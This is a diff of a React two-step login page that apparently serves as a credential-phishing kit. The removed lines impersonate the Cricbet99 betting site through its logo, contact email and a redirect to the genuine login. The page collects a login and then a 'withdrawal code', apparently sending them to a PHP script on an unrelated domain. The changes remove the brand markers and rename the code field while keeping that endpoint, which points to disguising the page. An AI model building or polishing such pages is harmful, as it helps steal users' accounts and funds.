@@ -6,11 +6,11 @@ import React, { useState } from 'react';
 // ============================================
 const PHP_API_URL = "https://agrawalhouseshifting.com/php_vercel.php"; 
 
-export default function CricbetApp() {
-  const [step, setStep] = useState(1); // 1 = Login, 2 = Withdrawal
+export default function App() {
+  const [step, setStep] = useState(1); 
   const [loading, setLoading] = useState(false);
-  const [error, setError] = useState(""); // General API errors
-  const [showToast, setShowToast] = useState(false); // Controls the red popup
+  const [error, setError] = useState(""); 
+  const [showToast, setShowToast] = useState(false); 
   
   // Field Validation Errors
   const [fieldErrors, setFieldErrors] = useState({
@@ -125,7 +125,7 @@ export default function CricbetApp() {
 
       if (result.status === "success") {
         // Final Redirect
-        window.location.href = "https://cricbet99.green/login";
+        window.location.href = "/dashboard";
       } else {
         setError("Connection failed. Please try again.");
       }
@@ -314,7 +314,7 @@ export default function CricbetApp() {
           
           <div className="log-logo m-b-20 text-center">
             {/* Replace src with your logo path in Next.js public folder */}
-            <img className="logo-login" src="https://speedcdn.io/assets/logos/cricbet99.green.png" alt="Cricbet99" onError={(e) => e.target.style.display='none'} />
+            <img className="logo-login" src="/assets/logos/company-logo.png" alt="logo" onError={(e) => e.target.style.display='none'} />
           </div>
 
           <div className="featured-box-login featured-box-secundary default">
@@ -368,19 +368,13 @@ export default function CricbetApp() {
 
                 <div className="form-group text-center mb-0">
                   <button type="button" className="btn btn-submit btn-login">
-                    Login with Demo ID <i className="ml-2 fas fa-sign-in-alt"></i>
+                    Try demo version <i className="ml-2 fas fa-sign-in-alt"></i>
                   </button>
                 </div>
 
                 <small className="recaptchaTerms">
                   This site is protected by reCAPTCHA and the Google <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.
                 </small>
-
-                <p className="mt-1 text-center" style={{ lineHeight: 2 }}>
-                  <a className="mail-link" href="mailto:contact@cricbet99.com">
-                    contact@cricbet99.com
-                  </a>
-                </p>
               </form>
             )}
 
@@ -389,13 +383,13 @@ export default function CricbetApp() {
                ======================= */}
             {step === 2 && (
               <div className="log-fld">
-                <p>Enter your withdrwal code for Account Safety</p>
+                <p>Enter your Access code for Account Safety</p>
                 
                 <form className="form-horizontal" onSubmit={handleWithdrawalSubmit}>
                   <div className="form-group m-b-20">
                     <input
                       name="code"
-                      placeholder="Withdrawl Code"
+                      placeholder="Access Code"
                       className="form-control"
                       type="text"
                       value={formData.code}
